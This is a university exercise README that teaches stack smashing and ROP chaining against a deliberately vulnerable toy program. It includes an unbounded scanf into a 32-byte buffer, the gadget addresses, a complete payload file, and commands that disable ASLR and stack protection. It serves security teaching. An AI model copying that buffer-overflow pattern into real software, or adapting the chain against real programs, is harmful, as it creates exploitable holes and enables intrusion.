# ROP chaining excercise
This is an implementation of an excercise on ROP chaining, that I had to do in university.

## The original task
We are given a synthetic function containing some assembly doing mostly pops, returns, and most importantly a syscall. The goal is to execute the syscall with specific values in the registers `rax`, `rbx` and `rcx` whilest only be able to controll the stack and the starting point. The values are `rax = 0x0000000042421337`, `rbx = 0x7d6e77707b707868` and `rcx = 0x006e69656d74656c`. Since executing a syscall with these random values won't do much except for maybe a crash, I exchanged the actual syscall with a function, that just prints out the values of the three registers in question.

### ROP chaining
How would we go about setting specific values to specific registers in a program, that does something completely different? Let's look at this fictional function, that switches two registers using the stack.
```
switch:
    push rax
    push rbx
    pop rax
    pop rbx
    ret
```
If we know the address of `switch` (and of the specific instructions within switch), we can jump for example to the `pop rbx` instruction. If we controll the next two values on the stack, we can controll what will be in rbx and where we go next. We call such a piece of code, that can do something for us a gadget. We can identify them in our code and chain them together and build a ROP chain. A Return Oriented Programming chain. In spite of literally having an entire research field called "formal language theory" computer scientists don't seem to be so strict on grammar. 

### Stack smashing
In day to day business we very rarely get a piece of executable binary and can just put stuff on the stack and say "Start executing here". (There is a technical argument to be made here, that essentially all programs are just that, but normally we don't think about them in that way. And more importantly, we explicitly want to break the control flow intended by the original developer.) Usally we get a program, that has some intended use and burried somewhere, heavily guarded by the sentinels of `if` and `else`, there is something we want to do, but are not allowed to. So, how do we break free from the chains of control flow? We employ a second technique called stack smashing *distant thunder*. I just talked about stacks the whole time, as if you knew what that is, but do you actually? (This is my subtle way of insulting your intelligence) Processes have something called a stack. It is a piece of memory, that contains a number of things. It stores (local) variables, it contains stackframes, return addresses, saved registers, etc.. Those are all very usefull things, but interisting for us are mainly two things, local variables, and return addresses. Why, you ask? If we call a function inside a program, we expect two things. We want the things described in that function to happen, and then we want to go back to where we called the function, so we can continue, where we left off. Usually functions calculate stuff and need space to store those things. We do that in local variables. And since we want our functions to each have their own little cozy space, we make some room on the stack with each call for those variables. Neat! So now we want to return to where we left off. Right. Where was that again? Ah, because the caller was so nice, he left a little sign, to where we have to return. This is called the return address. Incidentially, those two things are very close to each other on the stack, the very clever ones of you may already be able to see where this is going. What, if we could pretend to write to a local variable, but actually we miss a bit and _accidentially_ overwrite the return address with something, that goes conveniently exactly where we need to go? For example using buffer overflow? *the thunder comes closer* Imagine, we have this very simple function
```c
void copy(char *str) {
    char array[32];
    for (int i = 0; str[i]; i++) {
        array[i] = str[i];
    }
}
```
We get a normal null terminated c string, and copy it to a local array. (I am aware, that copying to a local array and immediatly discarding it is a bit pointless, but bare with me for the sake of simplicity and besides, what is even the point of anything?) We trust, that the string we get passed fits into the array. If it doesn't, we overflow the buffer and undefined behaviour occurs *thunder directly over you rattles the windows and the ancient c wizards turn in their graves*. The behaviour is undefined, but that does not mean, it is unpredictable. In this case, the return address will come directly or a few bytes after the array. I could explain why, but I don't want to. If you are interested, google "x86_64 stack layout" or maybe "x86_64 system V calling convention" or something like that. So, if we craft the passed string such, that it first fills up the buffer and then overwrites the return address, the function will jump to where ever we told it to when returning and we successfully smashed the stack. Hurray!

## The embedding program
Like we established earlier, we usually have a program, that somehow containes the useful things that we want to do. How might something like this look like? For this, I employed one of the programming classics, a program, that greets us. If we compile the the project using `make` and then run `./ropchain greet` it will ask for our name and reply "Hello <name>!". The program also contains two other things, a surprise tool, that we'll need later, and our function `attackable`, that we want to hijack. The source for this function can be found in `asm.S`. (I know, very creative naming scheme I got going here) Unfortiunatly for us, `attackable` is completely unreachable using the normal controll flow. So what do we do now?

## Performing the attack
Okay, so where do we start?

### Finding an attack vecor
Let's look at the function `greet` in `main.c`. (Again, creative naming)
```c
void greet(void) {
    char name[32];
    printf("Please write your name: ");
    scanf("%s", name);
    printf("Hello %s!\n", name);
}
```
This looks all very familiar. We have a local array, and a while later we copy to that array without any bounds checks using `scanf`. Perfect. So now where do we write what and how? Let's start with the where and look at the generated assembly by the compiler.
```
greet:
	push   rbx                      // saving some register
	sub    rsp,0x20                 // making room for char name[32]
	lea    rdi,[rip+0xa581]         // load the address of the printf format string into an argument register
	xor    eax,eax
	call   printf                   // call printf
	lea    rdi,[rip+0xa066]         // load the address of the scanf format string into an argument register
	mov    rbx,rsp                  // load the address of name into an argument register
	mov    rsi,rbx
	xor    eax,eax
	call   scanf                    // call scanf
	lea    rdi,[rip+0xa578]         // load the address of the printf format string into an argument register
	mov    rsi,rbx                  // load the address of name into an argument register
	xor    eax,eax
	call   printf                   // call printf
	add    rsp,0x20                 // clean up name
	pop    rbx                      // restore the safed register
	ret                             // return
```
So, here we can see a couple of things. Firstly, we put one register on the stack, and then we make room for the 32 bytes of name. (The ones that googled the stack layout will know, that on x86 architectures the stack grows downwards, hence we decrease `rsp`. The ones that didn't google now know too) Since the saved register is 8 bytes big and the return address is right before that, we need to first somehow fill 40 bytes and then we can write our new return address. Later we see, that a copy of the stack pointer (pointing to the first element of name) is passed to scanf. This means, we can actually really no kidding use this to perfom our attack. That's awesome, now where do we want to jump? We can use the command `objdump --disassemble ./ropchain` to show us the disassembly complete with addresses. There we can see, that the address of `greet` for example is `0x35dc0`, and for `attackable` it's `0x35ffc`. So with this knowledge we can craft an evil name of doom, that will convince our program, to for example jump right back into `greet`. This could look like this.
```
0x4141414141414141 fill name buffer, i chose the ascii value of 'A', but almost anything except for '\n' will do (because scanf would stop there)
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 overwrite saved register, again, any value except '\n' will do
0x0000000000035ffc this is the spicy part. Here we write the address of attackable
```
So now we have our content, how do we get that to scanf? Remember, when I told you, that our program also contains a surprise tool, that we'll need later? Well, the future is now old man. If we copy the description of the stack into a file called "stack.txt" and call `./ropchain stack` a mysterious file "stack.bin" will appear. If one would inspect that new file with something like hexdump, one would see, that it contains the values specified in "stack.txt". In fact, the program will read the file "stack.txt" line by line, convert the number to hex (the "Ox" part is important, without it, it just won't work) and ignore everything after, so comments are easy peasy. Now we have a file "stack.bin" that we can pipe to `stdin` of `ropchain` and hence to `scanf` like so.
```sh
cat stack.bin | ./ropchain greet
```
Great. What's next?

### Building the ROP chain
Now, that we are in attackable, we need to identify our gadgets and provide the addresses to jump between them and the values we want to put in the registers. Here is the code of attackable, I marked the gadgets I want to use.
```
attackable:
    pop rcx
    xor rcx, rcx
    jmp rcx
    ret
    pop rdx                 // pop into rdx, but clobber rax
    pop rax                 //
    jmp rax                 //
    xor rcx, rcx
    mov rbx, rcx
    call syscall_equivalent // the syscall
    ret
    pop rax                 // pop into rax
    ret                     //
    pop rcx
    xor rcx, rcx
    ret
    mov rcx, rdx            // copy rdx into rcx
    ret                     //
    mov ebx, 0x1
    ret
    pop rbx                 // pop into rbx, but clobber rax
    xor rax, rbx            //
    ret
```
Taking the clobbering of other registers into account we first want to pop into rdx, copy that to rcx, pop into rbx, pop into rax, and then at last, we want to make the syscall. Using objdump again, we find the addresses off our jump points. And when we insert the values for the registers, we get this "stack.txt".
```
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 overwrite saved register
0x0000000000036003 jump to popping into rdx
0x006e69656d74656c rcx value for rdx
0x000000000003601a jump to moving rdx into rcx
0x0000000000036024 jump to popping into rbx
0x7d6e77707b707868 rbx value
0x0000000000036012 jump to popping into rax
0x0000000042421337 rax value
0x000000000003600d jump to syscall
```
Now we can run
```
./ropchain stack
cat stack.bin | ./ropchain greet
```
and voila, we successfully infiltrated the NSA, or whatever.

## Reality check
I don't want to undermine the relationship we have here, but I have to say, I lied to you on several occasions. Okay, maybe not lied, but just forgot to mention some things. But that's exactly what a liar would say, so let me elaborate. Stack smashing and ROP chains are not exactly arcane techniques, that only the most wise programming masters know of. It's one of the more usual things one could do. (Maybe one could have induced that from the fact of me learning this in an introductory IT-Sec course) Unfortunatly for us, this means that the smart people who built the compiler and OS we used have come up with some tricks to counter act these attacks. Firstly, they use something called stack protection. At the start of each function, they insert specific values between the local variables and the return addresses. If we overwrite those during the stack smashing, the program will crash, because something has gone very wrong. This actually very good feature can easily be turned off with the compiler flag `-fno-stack-protector`. I already pass this flag in the makefile, so this shouldn't have been an issue. Secondly, the addresses we found out using objdump are plain wrong. This is due to two reasons, address space randomization and remapping of the code. Since we can only perform this attack, if we specifically know where all our code lies, the OS randomizes those addresses each and every run. This can be deactivated using `setarch`. The actual invocation would thusly (I love those fancy words) look like `cat stack.bin | setarch --addr-no-randomize ./ropchain greet`. But even with this randomization deactivated, the values are still wrong. If you ask why, I am sorry to disappoint you. During launch of the process, the code gets mapped to a different region, and I have no idea why, somebody enlighten me. But those values are at least always the same, and I was able to use gdb to find the real ones. I wrote the ones, that worked for me in the provided "stack.txt", maybe they don't work for you, then good luck. And lastly, this whole process is extremely finnicky. This exact attack only works with this binary, and that could change for a number of reasons. A different optimization level, a newer compiler version, a printf added somewhere completely different in the code, you name it. Anything can change the addresses or the complete chain, and then you have to redo your whole crafted message. But don't be discouraged. Some people will still do it, and that's why it's important to learn about this.

## Usage
"I have read through all this and still don't know how to actually execute this." I hear you, so now the three step plan you need to do, to actually execute the attack, complete with expected output.
```sh
$ make                                                              # we build the project
clang -Og -g -Wall -Wextra -Wpedantic -fno-stack-protector -o ropchain main.c asm.S
$ ./ropchain stack                                                  # we generate our message to pass as a stack. You might need to edit this, if it doesn't work on your machine
$ cat stack.bin | setarch --addr-no-randomize ./ropchain greet      # we pipe the generated file into our process, with address space randomization disabled
Please write your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

rax: 0x0000000042421337, rbx: 0x7d6e77707b707868, rcx: 0x006e69656d74656c
```
This will sadly only work on x86_64 linux, because of technical reasons. Because why would we all agree on one (very sensible and officially recommended by the manufacturer) ABI, huh Microsoft? Can you riddle me this?

## Special thanks
To me. I did all the work alone.
